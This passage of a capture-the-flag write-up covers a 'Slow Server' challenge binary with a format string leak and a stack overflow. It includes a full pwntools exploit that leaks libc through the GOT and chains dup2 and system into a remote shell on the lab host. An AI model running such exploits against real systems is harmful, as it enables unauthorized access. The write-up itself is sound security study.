@@ -376,3 +376,100 @@ p.interactive()
 Similar techniques (though harder given no free was available) were used in the advent of cyber 2024 side quest 3 challenge.
 
 ## Slow Server
+
+This is a binary that simulates a webserver; it does some weird operations with memory though, which can make decompiling it difficult (as both ghidra and binary ninja get confused by what they say). But basically:
+
+1. it listens for connections on :5555
+2. when one is received, it checks if its a GET, POST or DEBUG request, and hands off to the appropriate functions
+3. handle_debug_request takes the path value and adds it to sprintf, before printing the result - this is a format string vulnerability
+4. handle_post_request copies 0x400 bytes from the path into a 16 byte buffer, so a full stack overflow
+
+The binary is PIE and has most protections on, except its not stripped and doesn't have stack canaries. An initial solution would be to use a debug request to leak libc or binary addresses, and then use a post request with a ret2libc. Two issues however: the libc version is not provided, so offsets might be wrong between local and remote and secondly, the server is communicating via socket files - unless any spawned shell is bound to that particular socket handle, there will be no communication between local and remote. This could be resolved by calling **dup2** before system.
+
+A second issue with the debug handler was that the path passed to the sprintf call was a result of a call to c's strtok function, which would stop at null bytes. This meant a payload (like used for notspecified) where I send an address and a format string token to read the contents of that address in order to read from the GOT or similar would not work. However, the code DOES copy the entire contents of the sent request into the stack before method processing, so if I could find the location on the stack I might be able to read proper addresses. Through a lot of trial and error, testing both local and remote, this was found at position **147** (!), allowing me to read addresses from the GOT reliably (the read address function in the code below does this).
+
+So, the process overall is:
+
+- use debug to leak a reliable location to find the binary base. This is needed to find addresses of the GOT table
+- leak three locations from the got table to find the version of libc being used
+- once found, use of these leaks to find the base address of libc
+- create a payload that calls dup2 three times to redirect stdin, stdout and stderror to the socket used for the web connection
+- add a spawn of system /bin/sh to the payload
+- use post to trigger the stack overflow and rop chain to get a remote shell.
+
+The below script does this. A lot of experimentation was done with that debug function to find offsets.
+
+```python
+from pwn import *
+
+target = b"10.10.243.252"
+context.log_level='warn'
+
+def debug(path, specific_target = target, body = b''):
+    p = remote(specific_target, 5555)
+    if len(body) > 0:
+        body = b'\x0a\x0a' + body
+    p.sendline(b'DEBUG '+path+b' X' + body)
+    return p.recvall()
+
+def read_addr(addr_of_addr):
+    leak = debug(f'%147$s'.encode(), body=p64(addr_of_addr))
+    return u64(leak.ljust(8, b'\x00'))
+
+# the following pinpoints the libc version by leaking three addresses
+# these can then be used with https://libc.blukat.me to pinpoint the remote libc
+# identified as libc6_2.35-0ubuntu3.X_amd64, probably on ubuntu 22.04
+
+bin_base = int(debug(b'%136$p'), 16) - 0x1780
+free_leak = read_addr(bin_base + 0x3f18)
+# print(hex(free_leak)) # free
+# print(hex(read_addr(bin_base + 0x3f20))) # fread
+# print(hex(read_addr(bin_base + 0x3f28))) # write
+# exit()
+
+# the commented out offsets were for my local libc version, which was 2.61 or something.
+
+# readelf -s /lib64/libc.so.6 | grep free
+libc_base = free_leak - 0x0a53e0 # 0x1f4fd0
+print(hex(libc_base))
+
+sockfd = p64(4)
+
+# ROPgadget --binary /lib64/libc.so.6 | grep ': ret$'
+ret = p64(libc_base + 0x029139)# 0x028a41)
+# ROPgadget --binary /lib64/libc.so.6 | grep 'pop rdi ; ret$'
+pop_rdi_ret = p64(libc_base + 0x02a3e5)# 0x02b685)
+# ROPgadget --binary /lib64/libc.so.6 | grep 'pop rsi ; ret$'
+pop_rsi_ret = p64(libc_base + 0x02be51)# 0x02d1f1)
+# strings -a -t x /lib64/libc.so.6 | grep /bin/sh
+bin_sh = p64(libc_base + 0x1d8678)# 0x1b6ea4)
+# readelf -s /lib64/libc.so.6 | grep system
+system = p64(libc_base + 0x050d70)# 0x05672e)
+# readelf -s /lib64/libc.so.6 | grep dup2
+dup2 = p64(libc_base + 0x115010)# 0x10b27e)
+
+payload = flat([
+    b'A'*24,
+    ret,
+
+    pop_rdi_ret, sockfd,
+    pop_rsi_ret, p64(0),
+    dup2,
+
+    pop_rdi_ret, sockfd,
+    pop_rsi_ret, p64(1),
+    dup2,
+
+    pop_rdi_ret, sockfd,
+    pop_rsi_ret, p64(2),
+    dup2,
+
+    pop_rdi_ret, bin_sh,
+    ret,
+    system
+])
+
+p = remote(target, 5555)
+p.sendline(b'POST '+payload+b' X')
+p.interactive()
+```
